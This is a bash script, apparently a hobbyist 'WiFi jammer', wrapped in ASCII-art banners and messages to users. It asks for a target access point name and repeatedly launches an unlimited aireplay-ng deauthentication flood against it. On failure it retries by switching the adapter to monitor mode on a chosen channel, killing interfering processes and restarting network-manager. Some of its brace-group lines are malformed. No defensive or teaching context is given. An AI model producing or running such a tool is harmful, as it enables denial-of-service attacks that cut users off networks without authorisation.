#!/bin/bash 



echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
sleep 0.3
echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
sleep 0.3
echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
sleep 0.3
echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / "
sleep 0.3
echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
sleep 0.3
echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\""
sleep 1
echo ""
echo ""
echo ""                                                                            
                                                                              
echo "*********************** THANKS FOR USING MY TOOL **************************"
sleep 0.7

echo " "
echo "                  Press Ctrl+c Anywhere To Stop The Attack                 "
echo " "
sleep 0.8
echo "************************** GIVE A THUMBS UP ****************************** "
echo " "
echo " "
sleep 0.7
echo "                   COMMENT DOWN IF YOU HAVE ANY PROBLEM                    "
echo " "
echo " "
echo " "
sleep 0.7
echo "Tool Created BY :::::::::------- "
echo " "
echo " _  __    _    _   _     _ ___ _____   ____    _    _   _    _  "  
echo "|  \/  |  / \  | \ | |   | |_ _|_   _| / ___|  / \  | | | |  / \ "  
echo "| |\/| | / _ \ |  \| |_  | || |  | |   \___ \ / _ \ | |_| | / _ \ " 
echo "| |  | |/ ___ \| |\  | |_| || |  | |    ___) / ___ \|  _  |/ ___ \ "
echo "|_|  |_/_/   \_\_| \_|\___/|___| |_|   |____/_/   \_\_| |_/_/   \_\""
echo " "
echo " "
echo " "
sleep 0.7
read -p "Enter Target Wifi AP Name: " MAN
echo " "
aireplay-ng -0 0 -e "${MAN}" wlan0
if [ $? -ne 0 ]
then
echo ""
echo ""
echo "If It Is Giving An Error Wifi Is on Channel No.{(example -(10)} and AP Is On Channel No.{(example - 6)}."
echo ""
echo "Maybe You Will Get Another No. That I Am Given Above As Example."
echo ""
echo "It's Totally Okay Go Ahead And Enjoy Hacking "
sleep 1
echo ""
echo "Then Enter The AP Channel No.{(((IN THIS CASE AP CHANNEL NO. IS:-6 SO ENTER 6)))} OR, "
echo ""
echo "If You Are Getting Another Error, Just Hit Enter It Will Be Get Fixed Automatic: "
echo ""
echo ""

read -p "enter channel no.: " CHAN
{airmon-ng start wlan0 $CHAN}&> /dev/null
{airmon-ng check kill}&> /dev/null
{airmon-ng start wlan0}&> /dev/null
echo "Wait 5 seconds........."
sleep 5
echo " "
aireplay-ng -0 0 -e "${MAN}" wlan0
fi
if [ $? -ne 0 ]
then
echo " "
echo " "
aireplay-ng -0 0 -e "${MAN}" wlan0
fi
if [ $? -ne 0 ]
then
echo ""
echo ""
echo "Well, This Is The Last Attempt"
sleep 0.2
echo ""
echo "Surely, Your Wifi Adapter Is Hopping. "
echo ""
sleep 0.2
echo "If You Are Keep Getting Error bssid Not Found OR Any Other."
echo ""
sleep 0.2
echo "Just Restart Your Computer ;)"
echo ""
sleep 0.2
echo "Restarting Will Make Your Adapter Hopping Stop. :)"
echo ""
sleep 0.2
echo "   Happy Hacking   "
echo ""
sleep 0.2
read -p "enter channel no.: " CHAN
{airmon-ng start wlan0 $CHAN}&> /dev/null
echo "Wait 11 Sec .......... "
service network-manager stop
sleep 3
service network-manager start
sleep 3
{airmon-ng check kill}&> /dev/null
sleep 3
{airmon-ng start wlan0}&> /dev/null
aireplay-ng -0 0 -e "${MAN}" wlan0
fi


echo "*********************** THANKS FOR USING MY TOOL **************************"

echo " "
echo " "
echo "************************** GIVE A THUMBS UP ****************************** "
echo " "
echo " "
echo "                   COMMENT DOWN IF YOU HAVE ANY PROBLEM                    "
echo " " 
echo " "
echo " "
echo " _  __    _    _   _     _ ___ _____   ____    _    _   _    _  "  
echo "|  \/  |  / \  | \ | |   | |_ _|_   _| / ___|  / \  | | | |  / \ "  
echo "| |\/| | / _ \ |  \| |_  | || |  | |   \___ \ / _ \ | |_| | / _ \ " 
echo "| |  | |/ ___ \| |\  | |_| || |  | |    ___) / ___ \|  _  |/ ___ \ "
echo "|_|  |_/_/   \_\_| \_|\___/|___| |_|   |____/_/   \_\_| |_/_/   \_\""


